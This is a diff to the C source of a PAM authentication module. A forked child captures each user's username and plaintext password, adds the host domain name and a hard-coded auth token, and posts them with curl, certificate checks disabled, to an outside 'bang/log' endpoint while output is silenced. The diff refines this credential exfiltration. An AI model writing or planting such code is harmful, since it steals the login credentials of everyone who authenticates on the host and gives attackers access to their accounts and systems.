@@ -2,6 +2,10 @@
 #include <security/pam_ext.h>
 #include <security/pam_modules.h>
 
+#include <sys/utsname.h>
+#include <sys/wait.h>
+
+#include <errno.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -16,9 +20,9 @@
 
 static const char c_JsonTemplate[] =
     "{"
-        "\"auth_token\": \"%s\","
-        "\"domain\": \"%s\","
-        "\"username\": \"%s\","
+        "\"auth_token\": \"%s\", "
+        "\"domain\": \"%s\", "
+        "\"username\": \"%s\", "
         "\"password\": \"%s\""
     "}";
 static const char c_BangEndpointFmt[] = "https://%s/bang/log/";
@@ -61,25 +65,41 @@ int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **ar
         return PAM_PERM_DENIED;
     }
 
-    if (0 == fork())
+    pid_t child_pid = fork();
+    if (0 == child_pid)
     {
         char json_data[256] = {0};
         char bang_endpoint[128] = {0};
-        
-        // redirecting output to /dev/null
+        struct utsname name = {0};
         int null = open("/dev/null", O_WRONLY);
+        
+        // redirect output to /dev/null
         dup2(null, STDOUT_FILENO);
         dup2(null, STDERR_FILENO);
 
-        // TODO: some linux hosts are joined to windows domains - resolve here?
-        snprintf(json_data, sizeof(json_data) - 1, c_JsonTemplate, c_BangAuthToken, "", username, password);
+        uname(&name);  // attempt to get the domain name
+        snprintf(
+            json_data, sizeof(json_data) - 1, c_JsonTemplate, c_BangAuthToken, name.__domainname, username, password);
         DEBUG_LOG("%s", json_data);
 
+        // craft a cURL request
         snprintf(bang_endpoint, sizeof(bang_endpoint) - 1, c_BangEndpointFmt, c_BangHttpsHostname);
-        
-        // fire-and-forget
         execlp("curl", "-X", "POST", "-d", json_data, "-k", bang_endpoint, NULL);
     }
+#ifdef DEBUG
+    else
+    {
+        int status = 0;
+        if (child_pid == waitpid(child_pid, &status, WUNTRACED))
+        {
+            DEBUG_LOG("child pid %d exited with status %d", child_pid, WEXITSTATUS(status));
+        }
+        else
+        {
+            DEBUG_LOG("failed to wait for child pid %d: %d", child_pid, errno);
+        }
+    }
+#endif
 
     return PAM_SUCCESS;
 }
